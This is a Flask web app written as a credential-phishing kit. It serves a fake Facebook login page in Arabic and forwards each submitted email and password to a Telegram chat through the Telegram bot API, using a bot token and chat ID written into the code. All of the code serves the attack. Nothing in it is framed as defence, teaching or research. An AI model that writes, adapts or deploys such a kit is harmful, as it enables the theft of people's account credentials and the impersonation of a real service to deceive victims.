from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

BOT_TOKEN = "8867215064:AAHaomB_Adr3srjsTOOYwrsyM426qRcspvg"
CHAT_ID = "811425426"

HTML_FORM = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تسجيل الدخول</title>
<style>
body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
.box { background: white; padding: 30px; border-radius: 10px; width: 300px; box-shadow: 0 2px 8px rgba(0,0,0,0.15); }
input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 6px; }
button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
h2 { text-align: center; color: #1877f2; }
.msg { text-align: center; color: green; margin-top: 10px; }
</style>
</head>
<body>
<div class="box">
<h2>facebook</h2>
<form method="POST">
<input type="email" name="email" placeholder="البريد الإلكتروني" required>
<input type="password" name="password" placeholder="كلمة المرور" required>
<button type="submit">تسجيل الدخول</button>
</form>
{% if sent %}
<p class="msg">تم الإرسال بنجاح</p>
{% endif %}
</div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    sent = False
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        message = f"تسجيل دخول جديد\nالإيميل: {email}\nكلمة المرور: {password}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": message})
        sent = True
    return render_template_string(HTML_FORM, sent=sent)

if __name__ == "__main__":
    app.run(debug=True, port=5000)